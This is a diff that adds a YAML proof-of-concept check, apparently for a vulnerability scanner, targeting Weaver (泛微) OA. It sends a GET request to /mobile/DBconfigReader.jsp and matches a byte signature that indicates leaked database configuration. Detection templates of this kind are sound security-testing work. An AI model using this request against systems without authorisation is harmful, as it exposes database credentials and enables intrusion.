@@ -1,0 +1,16 @@
+id: poc-yaml-weaver-mobile-dbconfig-reader-info-leak
+info:
+  name: 泛微OA Mobile DBconfigReader 接口信息泄漏
+  severity: high
+  finger: weaver
+  osprey-id: vb_2019_0064
+  tags:
+  - 信息泄露
+requests:
+- method: GET
+  path: /mobile/DBconfigReader.jsp
+  expression: 'contains(body, "\r\n\r\n\r\n\r\n\r\n\x8a\xd2\xf1\xd4\x98~p")
+
+    '
+variables: {}
+transport: http
